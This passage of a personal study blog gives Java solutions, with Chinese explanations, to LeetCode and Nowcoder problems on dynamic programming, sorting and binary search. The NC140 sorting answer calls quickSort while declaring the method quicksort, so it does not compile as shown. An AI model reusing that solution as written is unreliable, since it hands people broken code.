class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height.length; i++) &#123;</span><br><span class="line">            dp[i] = Math.max(dp[i - <span class="number">1</span>], height[i - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> height.length - <span class="number">2</span>; i &gt;= <span class="number">1</span>; i--) &#123;</span><br><span class="line">            max = Math.max(max, height[i + <span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">if</span> (height[i] &gt;= max || height[i] &gt;= dp[i]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            res += Math.min(max, dp[i]) - height[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 双指针</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> height.length - <span class="number">2</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max_left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">max_right</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; height.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (height[left - <span class="number">1</span>] &lt; height[right + <span class="number">1</span>]) &#123;</span><br><span class="line">                max_left = Math.max(max_left, height[left - <span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (max_left &gt; height[left]) &#123;</span><br><span class="line">                    sum = sum + max_left - height[left];</span><br><span class="line">                &#125;</span><br><span class="line">                left++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                max_right = Math.max(max_right, height[right + <span class="number">1</span>]);</span><br><span class="line">                <span class="keyword">if</span> (max_right &gt; height[right]) &#123;</span><br><span class="line">                    sum = sum + max_right - height[right];</span><br><span class="line">                &#125;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 栈</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">trap</span><span class="params">(<span class="type">int</span>[] height)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        Stack&lt;Integer&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">current</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (current &lt; height.length) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!stack.empty() &amp;&amp; height[current] &gt; height[stack.peek()]) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> height[stack.peek()];</span><br><span class="line">                stack.pop();</span><br><span class="line">                <span class="keyword">if</span> (stack.empty()) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">distance</span> <span class="operator">=</span> current - stack.peek() - <span class="number">1</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">min</span> <span class="operator">=</span> Math.min(height[stack.peek()], height[current]);</span><br><span class="line">                sum = sum + distance * (min - h);</span><br><span class="line">            &#125;</span><br><span class="line">            stack.push(current);</span><br><span class="line">            current++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="494-目标和-x2F"><a href="#494-目标和-x2F" class="headerlink" title="494. 目标和&#x2F;"></a><a href="https://leetcode-cn.com/problems/target-sum/">494. 目标和</a>&#x2F;</h3><h4 id="方法一-动态规划"><a href="#方法一-动态规划" class="headerlink" title="方法一:动态规划"></a>方法一:动态规划</h4><p>找到nums一个正子集和一个负子集，使得总和等于target</p>
<p>我们假设P是正子集，N是负子集 例如： 假设nums &#x3D; [1, 2, 3, 4, 5]，target &#x3D; 3，一个可能的解决方案是+1-2+3-4+5 &#x3D; 3 这里正子集P &#x3D; [1, 3, 5]和负子集N &#x3D; [2, 4]</p>
<p>转化为背包问题,背包能放P个,然后怎么放.</p>
<p> dp[i]代表的含义是从nums中取数相加和为i时有多少种取法.</p>
<p>dp[0]&#x3D;1 其实已经是将题目转化成0&#x2F;1背包问题了，好比背包里面怎么放钱恰好放到8块钱，假如恰好放到0元，应该就是不放钱到背包这种情况了，所以只有一种情况，所以dp[0]&#x3D;1，没转化成01背包问题的时候 dp[0]&#x3D;1肯定不成立的！</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">                  sum(P) - sum(N) = target</span><br><span class="line">sum(P) + sum(N) + sum(P) - sum(N) = target + sum(P) + sum(N)</span><br><span class="line">                       2 * sum(P) = target + sum(nums)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findTargetSumWays</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> S)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            sum += nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((S + sum) % <span class="number">2</span> ==  <span class="number">1</span> || sum &lt; S) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> func(nums, (S + sum) &gt;&gt;&gt; <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> s)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[s + <span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> n : nums) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> s; j &gt;= n; j--) &#123;</span><br><span class="line">                dp[j] += dp[j - n];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[s];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-47-礼物的最大价值"><a href="#剑指-Offer-47-礼物的最大价值" class="headerlink" title="剑指 Offer 47. 礼物的最大价值"></a><a href="https://leetcode-cn.com/problems/li-wu-de-zui-da-jie-zhi-lcof/">剑指 Offer 47. 礼物的最大价值</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 动态规划</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxValue</span><span class="params">(<span class="type">int</span>[][] grid)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> grid.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> grid[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                dp[i + <span class="number">1</span>][j + <span class="number">1</span>] = Math.max(dp[i][j + <span class="number">1</span>], dp[i + <span class="number">1</span>][j]) + grid[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="300-最长上升子序列"><a href="#300-最长上升子序列" class="headerlink" title=" 300. 最长上升子序列"></a><a href="https://leetcode-cn.com/problems/longest-increasing-subsequence"> 300. 最长上升子序列</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLIS</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">if</span> (len &lt; <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> len;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[len];</span><br><span class="line">        Arrays.fill(dp, <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> dp[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; len; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &lt; nums[i]) &#123;</span><br><span class="line">                    dp[i] = Math.max(dp[j] + <span class="number">1</span>, dp[i]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            res = Math.max(res, dp[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="718-最长重复子数组"><a href="#718-最长重复子数组" class="headerlink" title="718. 最长重复子数组"></a><a href="https://leetcode-cn.com/problems/maximum-length-of-repeated-subarray/">718. 最长重复子数组</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findLength</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[m + <span class="number">1</span>][n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">max</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; m + <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j &lt; n + <span class="number">1</span>; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums1[i - <span class="number">1</span>] == nums2[j - <span class="number">1</span>]) &#123;</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                    max = Math.max(max, dp[i][j]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h2><h3 id="628-三个数的最大乘积-x2F-x2F"><a href="#628-三个数的最大乘积-x2F-x2F" class="headerlink" title="628. 三个数的最大乘积&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/maximum-product-of-three-numbers/">628. 三个数的最大乘积</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 先排序</span></span><br><span class="line"><span class="comment">// 如果数组中全是非负数，则排序后最大的三个数相乘即为最大乘积；如果全是非正数，则最大的三个数相乘同样也为最大乘积。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//如果数组中有正数有负数，则最大乘积既可能是三个最大正数的乘积，也可能是两个最小负数（即绝对值最大）与最大正数的乘积。</span></span><br><span class="line"><span class="comment">//求出三个最大正数的乘积，以及两个最小负数与最大正数的乘积，二者之间的最大值即为所求答案。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumProduct</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    Arrays.sort(nums);</span><br><span class="line">    <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">    <span class="keyword">return</span> Math.max(nums[<span class="number">0</span>]*nums[<span class="number">1</span>]*nums[n-<span class="number">1</span>], nums[n-<span class="number">3</span>]*nums[n-<span class="number">2</span>]*nums[n-<span class="number">1</span>]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线性扫描</span></span><br><span class="line"><span class="comment">// 只要求出数组中最大的三个数以及最小的两个数，可以不用排序，用线性扫描直接得出这五个数。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maximumProduct</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">min1</span> <span class="operator">=</span> Integer.MAX_VALUE, min2 = Integer.MAX_VALUE;</span><br><span class="line">    <span class="type">int</span> <span class="variable">max1</span> <span class="operator">=</span> Integer.MIN_VALUE, max2 = Integer.MIN_VALUE, max3 = Integer.MIN_VALUE;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> x: nums) &#123;</span><br><span class="line">      <span class="keyword">if</span> (x &lt; min1) &#123;</span><br><span class="line">        min2 = min1;</span><br><span class="line">        min1 = x;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &lt; min2) &#123;</span><br><span class="line">        min2 = x;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (x &gt; max1) &#123;</span><br><span class="line">      	max3 = max2;</span><br><span class="line">        max2 = max1;</span><br><span class="line">        max1 = x;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; max2) &#123;</span><br><span class="line">        max3 = max2;</span><br><span class="line">        max2 = x;</span><br><span class="line">      &#125; <span class="keyword">else</span> <span class="keyword">if</span> (x &gt; max3) &#123;</span><br><span class="line">        max3 = x;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> Math.max(min1 * min2 * max1, max3 * max2 * max1);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="324-摆动排序-II-x2F"><a href="#324-摆动排序-II-x2F" class="headerlink" title="324. 摆动排序 II&#x2F;"></a><a href="https://leetcode-cn.com/problems/wiggle-sort-ii/">324. 摆动排序 II</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 尽量将小数部分的最大数放在边上，这样只用靠近一个大数部分的最大数。</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">wiggleSort</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] help = nums.clone();</span><br><span class="line">        Arrays.sort(help);</span><br><span class="line">        <span class="type">int</span> <span class="variable">N</span> <span class="operator">=</span> nums.length;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; nums.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            nums[i] = help[--N];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i += <span class="number">2</span>) &#123;</span><br><span class="line">            nums[i] = help[--N];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="排序-NC140-x2F"><a href="#排序-NC140-x2F" class="headerlink" title="排序(NC140)&#x2F;"></a><a href="https://www.nowcoder.com/practice/2baf799ea0594abd974d37139de27896?tpId=196&rp=1&ru=/ta/job-code-total&qru=/ta/job-code-total/question-ranking&tab=answerKey">排序(NC140)</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] MySort (<span class="type">int</span>[] arr) &#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        quickSort(arr, <span class="number">0</span>, arr.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> arr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">quicksort</span><span class="params">(<span class="type">int</span>[] arr, <span class="type">int</span> start, <span class="type">int</span> end)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= end) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> start;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> end;</span><br><span class="line">        <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> arr[i];</span><br><span class="line">        <span class="keyword">while</span> (i &lt; j) &#123;</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; arr[j] &gt;= temp) j--;</span><br><span class="line">            arr[i] = arr[j];</span><br><span class="line">            <span class="keyword">while</span> (i &lt; j &amp;&amp; arr[i] &lt;= temp) i++;</span><br><span class="line">            arr[j] = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">        arr[i] = temp;</span><br><span class="line">        quickSort(arr, start, i - <span class="number">1</span>);</span><br><span class="line">        quickSort(arr, i + <span class="number">1</span>, end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-21-调整数组顺序使奇数位于偶数前面"><a href="#剑指-Offer-21-调整数组顺序使奇数位于偶数前面" class="headerlink" title="剑指 Offer 21. 调整数组顺序使奇数位于偶数前面"></a><a href="https://leetcode-cn.com/problems/diao-zheng-shu-zu-shun-xu-shi-qi-shu-wei-yu-ou-shu-qian-mian-lcof/">剑指 Offer 21. 调整数组顺序使奇数位于偶数前面</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] exchange(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[left] % <span class="number">2</span> != <span class="number">0</span>) &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (left &lt; right &amp;&amp; nums[right] % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (left &lt; right) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">temp</span> <span class="operator">=</span> nums[left];</span><br><span class="line">                nums[left] = nums[right];</span><br><span class="line">                nums[right] = temp;</span><br><span class="line">            &#125;</span><br><span class="line">            left++;</span><br><span class="line">            right--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-53-I-在排序数组中查找数字-I"><a href="#剑指-Offer-53-I-在排序数组中查找数字-I" class="headerlink" title="剑指 Offer 53 - I. 在排序数组中查找数字 I"></a><a href="https://leetcode-cn.com/problems/zai-pai-xu-shu-zu-zhong-cha-zhao-shu-zi-lcof/">剑指 Offer 53 - I. 在排序数组中查找数字 I</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 二分, 注意&gt;&gt;的优先级比+号低, 会先算+,然后再&gt;&gt;; 所以得加括号</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (nums.length == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + ((right - left) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (target == nums[mid]) &#123;</span><br><span class="line">                count++;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> mid;</span><br><span class="line">                <span class="keyword">while</span> (left &lt; i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nums[--i] != target) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">                i = mid;</span><br><span class="line">                <span class="keyword">while</span> (right &gt; i) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (nums[++i] != target) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    count++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &lt; nums[mid]) &#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> count;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="69-x-的平方根"><a href="#69-x-的平方根" class="headerlink" title=" 69. x 的平方根"></a><a href="https://leetcode-cn.com/problems/sqrtx"> 69. x 的平方根</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">mySqrt</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> x / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">while</span> (left &lt; right) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> left + ((right - left + <span class="number">1</span>) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="comment">// x = 4的时候会死循环</span></span><br><span class="line">            <span class="comment">//int mid = left + ((right - left) &gt;&gt; 1);</span></span><br><span class="line">            <span class="comment">// 避免乘法溢出</span></span><br><span class="line">            <span class="keyword">if</span> (mid == x / mid) &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (mid &gt; x / mid) &#123;</span><br><span class="line">                right = mid - <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                left = mid;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> left;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="704-二分查找"><a href="#704-二分查找" class="headerlink" title=" 704. 二分查找"></a><a href="https://leetcode-cn.com/problems/binary-search"> 704. 二分查找</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">search</span><span class="params">(<span class="type">int</span>[] nums, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[<span class="number">0</span>] || target &gt; nums[nums.length - <span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> (l &lt;= r) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> l + ((r - l) &gt;&gt; <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span> (nums[mid] == target) &#123;</span><br><span class="line">                <span class="keyword">return</span> mid;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; nums[mid]) &#123;</span><br><span class="line">                l = mid + <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                r = mid - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



